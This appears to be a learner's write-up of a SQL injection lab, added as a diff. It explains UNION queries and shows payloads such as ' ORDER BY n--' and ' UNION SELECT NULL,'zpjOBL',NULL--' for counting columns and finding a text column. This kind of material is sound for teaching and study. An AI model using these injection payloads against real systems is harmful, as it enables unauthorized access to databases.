@@ -1,0 +1,69 @@
+LAB 04: SQL injection UNION attack, finding a column containing text
+
+End Goal: Perform SQL-injection attack and find the column containing the text.
+
+Background (Union):
+
+table1      table2
+a | b       c | d 
+-----       -----
+1 , 2       2 , 3
+3 , 4       4 , 5
+
+Query #1: select a, b from table1
+1,2
+3,4
+
+Query #2: select a, b from table1 UNION select c,d from table2
+1,2
+3,4
+2,3
+4,5
+
+Rule: 
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible
+
+Step #1: Determine # of columns
+
+SQLi attack (way #1):
+
+select ? from table1 UNION select NULL, NULL
+-error -> incorrect number of columns
+
+select ? from table1 UNION select NULL, NULL, NULL
+-200 response code -> correct number of columns
+
+SQLi attack (way #2):
+
+select a, b from table1 order by 3
+
+Step#2: Determine the datatype of the column
+Note: As I know that the database has the three column, I can use SELECT NULL trick here to Determine the datatype of the column Example:
+
+ SELECT column1,column2,column3 FROM users UNION SELECT NULL,NULL,'a'
+ ==> error--> column3 is not type text
+ ==> no-error--> column3 is type text
+
+ ANALYSIS OF THE LAB:
+ 1. ' ORDER BY 1--
+ ==> successfully showing the result in the page==> but the first column is not showing in the page, it might be hidden in the backend.
+
+ 2. ' ORDER BY 2--
+ ==> successfully showing the result in the page==> the second column has been ordered
+
+ 3.' ORDER BY 3--
+ ==> successfully showing the reuslt in the page==> the third column has been ordered
+
+ 4. ' ORDER BY 4--
+ ==> shows a internal server error so we got to know that, there is total of (4-1) i.e 3 columns in the database where 1st column in hidden in the website the rest of 2 is shown.
+
+ ***NOW WE HAVE TO CHECK FOR THE TEXT CONTAIN IN THE column
+ The question is: Make the database retrieve the string: 'zpjOBL'
+ --> so I will be using UNION NULL FOR THIS:
+ Exact payload I will give in website: ' UNION SELECT NULL,NULL,NULL--
+ and In place of NULL I can put the string to check wheather the column matches the string or not? 
+ ==> so the payload would be--> ' UNION SELECT NULL,'zpjOBL',NULL-- {this will solve the lab}
+ ==> And what happen in my backend?
+ ==> The backend payload looks like: SELECT column1,column2,column3 FROM users ' UNION SELECT NULL,'zpjOBL',NULL--
+ so if it does matches the gives the result
